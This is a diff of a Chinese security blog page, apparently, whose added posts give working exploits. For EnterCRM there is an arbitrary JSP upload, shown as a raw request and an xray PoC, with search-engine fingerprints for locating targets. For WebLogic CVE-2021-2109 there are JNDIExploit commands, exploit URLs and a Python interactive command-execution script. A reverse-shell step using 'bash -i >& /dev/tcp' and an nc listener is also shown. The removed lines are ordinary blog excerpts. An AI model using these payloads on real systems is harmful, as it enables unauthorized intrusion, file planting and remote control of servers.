-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/11/26/%E7%99%BD%E5%AB%96Azure%E8%B4%A6%E6%88%B7200%E7%BE%8E%E5%85%83-12%E6%9C%88%E5%85%8D%E8%B4%B9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" target="_self">
-          白嫖Azure账户200美元+12月免费云服务器
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/11/26/%E7%99%BD%E5%AB%96Azure%E8%B4%A6%E6%88%B7200%E7%BE%8E%E5%85%83-12%E6%9C%88%E5%85%8D%E8%B4%B9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" target="_self">
-        <div>
-          注意事项💡 想享受Azure免费12个月试用的限制：  需要试用完200美元或者过了30天后，必须升级即用即付后，才能享受12个月免费服务。 免费12个月期间，如果产生扣费（比如流量超了）会在下个月账单中直接信用卡扣费。（需要关注自己的流量使用情况） 免费12个月到期后，订阅不会自带停止，如果不主动关闭已开通的免费资源会直接产生扣费。  活动地址https://azure.microsoft.c
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-11-26 16:37" pubdate>
-              2023-11-26
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="category-chain-item">云服务器</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/Azure/">#Azure</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        
-        <a href="/2023/11/11/Fluid%E4%BD%BF%E7%94%A8Waline%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/" target="_self">
-          Fluid使用Waline评论系统
-        </a>
-      </h1>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2023/11/11/Fluid%E4%BD%BF%E7%94%A8Waline%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/" target="_self">
-        <div>
-          1.  简介Waline 是一款基于 Valine 衍生的简洁、安全的评论系统。 官网链接：waline.js.org&#x2F;  我这里是直接部署到Vercel上 实现效果：  2. 部署步骤2.1  LeanCloud 设置 (数据库) 登录 或 注册 LeanCloud 国际版 并进入 控制台  点击左上角 创建应用 并起一个你喜欢的名字 (请选择免费的开发版):   进入应用，选择左下角
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2023-11-11 13:41" pubdate>
-              2023-11-11
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/blog/">#blog</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-
-
-  <nav aria-label="navigation">
-    <span class="pagination" id="pagination">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/#board">2</a><a class="page-number" href="/page/3/#board">3</a><a class="page-number" href="/page/4/#board">4</a><a class="extend next" rel="next" href="/page/2/#board"><i class="iconfont icon-arrowright"></i></a>
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
     </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/14/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9CRM%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">浙大恩特CRM前台任意文件上传漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-14 10:25:10" itemprop="dateCreated datePublished" datetime="2023-12-14T10:25:10+08:00">2023-12-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-12-26 08:53:12" itemprop="dateModified" datetime="2023-12-26T08:53:12+08:00">2023-12-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/POC/" itemprop="url" rel="index"><span itemprop="name">POC</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。</p>
+<h2 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h2><p>FOFA:product&#x3D;”EnterCRM”</p>
+<p>QUAKE：EnterCRM AND title: “欢迎使用浙大恩特客户资源管理系统”</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
+<li>访问以下接口</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/entsoft/CustomerAction.entphone;.js?method=loadFile</span><br></pre></td></tr></table></figure>
+
+<p>当访问接口时出现如下响应体时，可认定该漏洞存在</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312141026747.png" alt="路径"></p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312141026796.png" alt="返回路径"></p>
+<ol start="2">
+<li>上传EXP</li>
+</ol>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1</span><br><span class="line">Host: xxxxxxxx</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A</span><br><span class="line">Content-Length: 208</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarye8FPHsIAq9JN8j2A</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;filename=&quot;xx.jsp&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;<span class="comment">%out.print(&quot;hello world&quot;);%&gt;</span></span><br><span class="line">------WebKitFormBoundarye8FPHsIAq9JN8j2A--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312141026802.png" alt="上传请求"></p>
+<ol start="3">
+<li>访问 filepath路径，发现上传的jsp成功解析</li>
+</ol>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312141027400.png" alt="访问请求路径"></p>
+<h2 id="xray-poc"><a href="#xray-poc" class="headerlink" title="xray poc"></a>xray poc</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-entsoft-customeraction-upload</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">set:</span></span><br><span class="line">  <span class="attr">rfilename:</span> <span class="string">randomLowercase(4)</span></span><br><span class="line">  <span class="attr">s1:</span> <span class="string">randomInt(40000,</span> <span class="number">44800</span><span class="string">)</span></span><br><span class="line">  <span class="attr">s2:</span> <span class="string">randomInt(40000,</span> <span class="number">44800</span><span class="string">)</span></span><br><span class="line">  <span class="attr">rBoundary:</span> <span class="string">randomLowercase(8)</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="attr">r0:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/entsoft/CustomerAction.entphone;.js?method=loadFile</span></span><br><span class="line">      <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body_string.contains(&quot;filepath&quot;)</span></span><br><span class="line">  <span class="attr">r1:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">method:</span> <span class="string">POST</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/entsoft/CustomerAction.entphone;.js?method=loadFile</span></span><br><span class="line">      <span class="attr">headers:</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">multipart/form-data;</span> <span class="string">boundary=----WebKitFormBoundary&#123;&#123;rBoundary&#125;&#125;</span></span><br><span class="line">      <span class="attr">body:</span> <span class="string">&quot;\</span></span><br><span class="line"><span class="string">        ------WebKitFormBoundary<span class="template-variable">&#123;&#123;rBoundary&#125;&#125;</span>\r\n\</span></span><br><span class="line"><span class="string">        Content-Disposition: form-data; name=\&quot;file\&quot;;filename=\&quot;<span class="template-variable">&#123;&#123;rfilename&#125;&#125;</span>.jsp\&quot;\r\n\</span></span><br><span class="line"><span class="string">        Content-Type: image/jpeg\r\n\</span></span><br><span class="line"><span class="string">        \r\n\</span></span><br><span class="line"><span class="string">        &lt;%out.print(<span class="template-variable">&#123;&#123;s1&#125;&#125;</span> * <span class="template-variable">&#123;&#123;s2&#125;&#125;</span>);new java.io.File(application.getRealPath(request.getServletPath())).delete();%&gt;\r\n\</span></span><br><span class="line"><span class="string">        ------WebKitFormBoundary<span class="template-variable">&#123;&#123;rBoundary&#125;&#125;</span>--\r\n\</span></span><br><span class="line"><span class="string">        &quot;</span></span><br><span class="line">      <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body_string.contains(&quot;filepath&quot;)</span></span><br><span class="line">    <span class="attr">output:</span></span><br><span class="line">      <span class="attr">search:</span> <span class="string">&#x27;&quot;filepath\&quot;:\&quot;(?P&lt;filepath&gt;.+?)\&quot;&quot;.bsubmatch(response.body)&#x27;</span></span><br><span class="line">      <span class="attr">filepath:</span> <span class="string">search[&quot;filepath&quot;]</span></span><br><span class="line">  <span class="attr">r2:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">cache:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/&#123;&#123;filepath&#125;&#125;</span></span><br><span class="line">      <span class="attr">follow_redirects:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">response.status</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">response.body.bcontains(bytes(string(s1</span> <span class="string">*</span> <span class="string">s2)))</span></span><br><span class="line"><span class="attr">expression:</span> <span class="string">r0()</span> <span class="string">&amp;&amp;</span> <span class="string">r1()</span> <span class="string">&amp;&amp;</span> <span class="string">r2()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">m0ch4z(https://cyberzone.cloud)</span></span><br><span class="line">  <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://stack.chaitin.com/vuldb/detail/26cbc252-9273-4020-b72c-00eb03bca4b2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312141027019.png" alt="xpoc批量验证"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/12/10/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-2109)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/10/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-2109)/" class="post-title-link" itemprop="url">Weblogic LDAP 远程代码执行漏洞（CVE-2021-2109)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-12-10 23:13:09 / 修改时间：23:22:50" itemprop="dateCreated datePublished" datetime="2023-12-10T23:13:09+08:00">2023-12-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>WebLogic Server 10.3.6.0.0<br>WebLogic Server 12.1.3.0.0<br>WebLogic Server 12.2.1.3.0<br>WebLogic Server 12.2.1.4.0<br>WebLogic Server 14.1.1.0.0</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问一下URL <a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal">http://xxx.xxx.xxx.xxx:7001</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/8363905/1616273055974-6f7eeee2-557c-4b6d-ba6e-c8a63197fefa.png#averageHue=%23fcfcf9&height=428&id=LkmI0&originHeight=856&originWidth=1417&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99287&status=done&style=none&title=&width=708.5" alt="image.png"><br>如果有此页面未授权可访问，且在影响范围内则可能出现漏洞<br>下载漏洞攻击需要的 LDAP启动脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11 #下载地址</span><br><span class="line">unzip JNDIExploit.v1.11.zip </span><br><span class="line">java -jar JNDIExploit.v1.11.jar -i xxx.xxx.xxx.xxx #启动</span><br></pre></td></tr></table></figure>
+
+<p>服务器启动，注意放行服务器端口，切jdk版本为低版本，我用到jdk8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (服务器地址)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315557.png" alt="image.png"><br>然后配合 Weblogic未授权范围 命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22)</span><br></pre></td></tr></table></figure>
+
+<p>注意 ldap:&#x2F;&#x2F;xxx.xxx.xxx;xxx:1389&#x2F;Basic&#x2F;WeblogicEcho 这里 LDAP服务器地址第三个分隔符号为 ;<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315580.png" alt="image.png"><br>登录后台可使用此POC，未授权的话用上面的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22)</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用POC"><a href="#漏洞利用POC" class="headerlink" title="漏洞利用POC"></a>漏洞利用POC</h3><p>peiqi文库中的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号 : PeiQi文库                                                     \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: Weblogic 多个版本                                           \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mLDAP        &gt;&gt;&gt; ldap://xxx.xxx.xxx;xxx:1389                         \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url, ldap_url, cmd</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22&#123;&#125;/Basic/WeblogicEcho;AdminServer%22)&quot;</span>.<span class="built_in">format</span>(ldap_url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[36m[o] 正在请求: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(vuln_url))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: cmd</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root:&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 目标&#123;&#125;存在漏洞 \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 命令执行失败 \033[0m&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请检查参数和Ldap服务是否正确 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_2</span>(<span class="params">target_url, ldap_url, cmd</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22&#123;&#125;/Basic/WeblogicEcho;AdminServer%22)&quot;</span>.<span class="built_in">format</span>(ldap_url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[36m[o] 正在请求: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(vuln_url))</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: cmd</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="built_in">format</span>(response))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请检查参数和Ldap服务是否正确 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    ldap_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mLdap &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url, ldap_url, cmd=<span class="string">&quot;cat /etc/passwd&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&quot;\033[35mCmd &gt;&gt;&gt; \033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            POC_2(target_url, ldap_url, cmd)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315756.png" alt="image.png"></p>
+<h3 id="深入系列一、反弹shell"><a href="#深入系列一、反弹shell" class="headerlink" title="深入系列一、反弹shell"></a>深入系列一、反弹shell</h3><h4 id="第一步-准备shell"><a href="#第一步-准备shell" class="headerlink" title="第一步 准备shell"></a>第一步 准备shell</h4><p>先写一个反弹shell的 sh在vps上<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315785.png" alt="image.png"><br>内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315786.png" alt="image.png"><br>接着开启一个http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315790.png" alt="image.png"></p>
